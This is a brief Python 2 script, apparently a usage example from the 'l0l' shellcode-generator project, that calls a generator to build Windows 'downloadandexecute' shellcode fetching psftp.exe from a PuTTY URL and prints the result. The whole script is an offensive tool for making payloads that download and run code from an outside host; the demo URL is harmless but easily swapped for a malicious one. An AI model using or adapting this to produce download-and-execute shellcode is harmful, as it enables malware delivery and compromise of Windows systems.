#------------------------------------------------------------------# 
#Author  : roissy
#Greetz  : b3mb4m, esw0rmer, bomch4nte
#Concat  : roissy@tuta.io
#Project : https://github.com/roissy/l0l
#LICENSE : https://github.com/roissy/l0l/blob/master/LICENSE
#------------------------------------------------------------------#

from generator import *

qweqwe = "http://the.earth.li/~sgtatham/putty/latest/x86/psftp.exe" 

shellcode = generator( "windows", "downloadandexecute", qweqwe)

print shellcode


